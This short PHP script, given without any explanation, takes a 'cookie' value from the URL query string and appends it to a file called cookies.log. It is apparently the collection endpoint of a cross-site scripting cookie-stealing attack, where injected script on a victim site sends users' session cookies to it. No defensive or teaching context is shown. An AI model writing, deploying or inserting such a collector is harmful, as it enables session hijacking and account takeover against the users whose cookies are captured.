<?php
    $logFile = 'cookies.log';
    $cookie = $_GET['cookie'];
    file_put_contents($logFile, $cookie . "\n", FILE_APPEND | LOCK_EX);
?>